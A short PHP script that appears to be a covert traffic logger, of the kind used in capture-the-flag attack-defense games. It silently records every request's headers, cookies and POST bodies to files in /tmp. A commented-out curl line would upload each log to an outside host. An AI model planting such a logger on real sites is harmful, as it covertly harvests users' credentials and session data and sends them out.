<?php
error_reporting(0);
$lname = 'sns_';

function savelog($remote, $y1ngres) {
    global $lname;
    $savename = '/tmp/' . $lname . $remote;
    $y1ngfp = fopen($savename ,'a+');
    fwrite($y1ngfp, $y1ngres);
    fclose($y1ngfp);
    // system("curl -F 'file=@/tmp/$lname$remote' http://192.168.121.61:12345/");
}

function logger() {
    $y1ngres = $_SERVER['REQUEST_METHOD'] . ' ' . $_SERVER['REQUEST_URI'] . "\n";
    $y1ngres .= "REMOTE_ADDR: " . $_SERVER['REMOTE_ADDR'];
    $y1ngres .= "\nHeaders:\n";
    foreach ($_SERVER as $key => $value) {
        if (preg_match('/HTTP.*/i', $key)) {
            $key = preg_replace('/HTTP\_/','', $key);
            $key = str_replace('_','-', $key);
            $y1ngres .= '    '.$key . ': ' . $value . "\n";
        }
    }
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $y1ngres .= "POST:\n";
        $y1ngres .= urldecode($_POST?http_build_query($_POST):file_get_contents("php://input"));
    }
    $y1ngres .= "\n\n";
    
    /* 写入log文件 */
    savelog($_SERVER['REMOTE_ADDR'], $y1ngres);
    return $y1ngres;
}

logger();

